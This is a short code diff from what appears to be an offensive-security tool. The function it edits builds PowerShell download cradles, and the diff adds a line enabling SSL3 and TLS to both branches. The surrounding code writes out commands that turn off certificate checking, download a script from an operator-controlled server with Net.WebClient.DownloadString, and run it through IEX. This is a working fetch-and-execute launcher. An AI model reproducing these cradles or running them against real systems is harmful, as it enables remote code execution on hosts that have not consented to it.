@@ -197,6 +197,7 @@ def gen_ps_iex_cradle(context, scripts, command=str(), post_back=True):
 
         launcher = """
 [Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
 IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/{ps_script_name}')
 {command}
 """.format(server=context.server,
@@ -207,6 +208,7 @@ IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/{ps_scri
 
     elif type(scripts) is list:
         launcher = '[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n'
+        launcher +="[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'"
         for script in scripts:
             launcher += "IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/{script}')\n".format(server=context.server,
                                                                                                                       port=context.server_port,
